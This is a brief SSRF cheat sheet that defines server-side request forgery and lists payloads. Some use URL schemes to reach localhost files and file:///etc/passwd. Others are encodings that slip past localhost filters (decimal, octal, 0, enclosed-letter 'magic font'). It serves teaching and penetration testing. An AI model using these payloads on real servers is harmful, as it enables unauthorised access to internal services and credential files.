## Server Side Request Forgery (SSRF)

![](https://media.geeksforgeeks.org/wp-content/uploads/20210326225503/RRRBlueandRedFlatGraphicMoonCratersAstronomyClassroomGroupWork1-660x371.png)

**What is SSRF Attack?**

Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location. In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure.

**SSRF With Schema**
```
http ==> http://localhost/secretfile.txt
https ==> https://localhost/secretfile.txt
file ==> file:///etc/passwd
```
**Bypass Localhost**
```
127.0.0.*
0.0.0.0
localhost
http://2130706433/ (decimal value)]
http://0177.0.0.1/
http://0/
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ (Magic Font)
```
